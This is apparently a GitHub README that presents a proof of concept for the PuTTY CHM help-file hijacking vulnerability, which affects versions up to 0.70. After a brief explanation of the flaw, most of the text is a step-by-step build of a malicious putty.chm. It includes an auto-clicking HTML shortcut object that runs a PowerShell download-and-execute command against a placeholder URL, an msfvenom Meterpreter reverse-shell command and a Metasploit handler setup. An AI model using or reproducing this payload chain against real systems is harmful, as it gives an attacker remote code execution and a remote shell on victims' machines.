# PuTTY vulnerability vuln-chm-hijack
Potential malicious code execution via CHM hijacking

### About
Up to and including version 0.70, when you launched the online help in any of the Windows PuTTY GUI tools, the tool would locate its help file by looking alongside its own executable.

If you were running PuTTY from a directory that unrelated code could arrange to drop files into (for example, running it directly from a browser's default download directory), this means that if somebody contrived to get a file called putty.chm into that directory (for example, by enticing you to click on a download link with that name) then PuTTY would believe it was the real help file, and feed it to htmlhelp.exe. 

This is a vulnerability because HTML Help files (.chm) can arrange in turn to run code of their choice, for example by embedding an <OBJECT> HTML element that is a Windows shortcut, plus Javascript to click it.

More details: https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-chm-hijack.html

### What is CHM file? 

CHM is an extension for the Compiled HTML file format, most commonly used by Microsoft’s HTML-based help program. It may contain many compressed HTML documents and the images and JavaScript they link to. CHM features include a table of contents, index, and full text searching.

### This used before? 
In the past, threat actors used a CHM files to drop the backdoor file, which is commonly used in targeted attacks.

#### Some examples: 
https://www.bleepingcomputer.com/news/security/malicious-chm-files-being-used-to-install-brazilian-banking-trojans/
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/

### Procedure for generating Malicious CHM file

We need to HTML Help Workshop toolkit for create a CHM file.  After installation, then launch HTML Help Workshop tool. 

##### Steps

Click on File > New > Project and follow above steps:

![Creating HTML Help Project](https://raw.githubusercontent.com/yasinyilmaz/vuln-chm-hijack/master/img/htmlhelp1.png?token=AJAW6P6ROJBHAYPGNASRB2C44LKAW)

1. New Project Screen > Next > Browse 

2. Specify the name of your project file, and where you wild like it to be created. 

Fill File name: putty and click on "Open"

![Specify your HTML Help Project](https://raw.githubusercontent.com/yasinyilmaz/vuln-chm-hijack/master/img/htmlhelp2.png?token=AJAW6P2ZVN7U3FFQSHAGYX244LKB6)

3. If you have already created HTML file that you select to include in your project. 

Select HTML files (.htm)

Speciy where your .htm files are located. 

Add.. button and select an already created directory for exploit to hold your malicious file like as putty.htm 

![Select a HTM file](https://raw.githubusercontent.com/yasinyilmaz/vuln-chm-hijack/master/img/htmlhelp3.png?token=AJAW6P2IMQ44M7SU6U2IVOS44LKCU)

4. Wizard create a new HTML Help Project. We need to make changes. 

5. In the tool, double click on the created htm to edit it, then insert the code below to create a basic Help file:


```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<Title>putty</Title>
</HEAD>
<BODY>


</BODY>
</HTML>

```

6. Now, we create a button object which starts malicious exe when it’s clicked. In addition to the object, we also add a script part which will click the button automatically when the document is opened:


```
<html>
<title> PuTTY Help </title>
<head>
</head>
<body>

<OBJECT id=shortcut classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap:shortcut">
<PARAM name="Item1" value=",powershell.exe, -nop -NoProfile -WindowsStyle 1 -c -IEX (New-Object Net.WebClient).DownloadString('{YOUR MALICIOUS FILE URL}')">
<PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
shortcut.Click();
</SCRIPT>

<h2 align=center> PuTTY CHM </h2>
<p><h3 align=center> Welcome! </h3></p>
</body>
</html>

```
![Create malicious file](https://raw.githubusercontent.com/yasinyilmaz/vuln-chm-hijack/master/img/htmlhelp4.jpg?token=AJAW6P7N6GHRGXSXWGOW2S244LKDQ)


7. The PowerShell command will connect to the listed remote URL and execute the meterpreter that the site responds with. This remote script can be other PowerShell(.ps) script or Meterpreter Payload for Windows. 



How do I create a simple TCP Meterpreter Payload for Windows?

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={YOUR IP} LPORT={PORT } -f exe > malware.exe

```


When you double click on the Help button a putty.exe spawns as a child of malware.exe which is the interpretor of the CHM binary file.(Your malicious putty.chm and putty.exe file should be hold same directory)
  
![Spawns a malware](https://raw.githubusercontent.com/yasinyilmaz/vuln-chm-hijack/master/img/htmlhelp5.png?token=AJAW6P23TU4IRPER4L2RUK244LKGC)

How do I get the meterpreter shell?


```
msfconsole 
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost {YOUR IP}
lhost => {YOUR IP}
msf exploit(multi/handler) > set lport {PORT}
lport => {PORT}
msf exploit(multi/handler) > run

```

Resources: 
1. https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-chm-hijack.html
2. https://safe-cyberdefense.com/hide-malware-microsoft-html-interpretors/
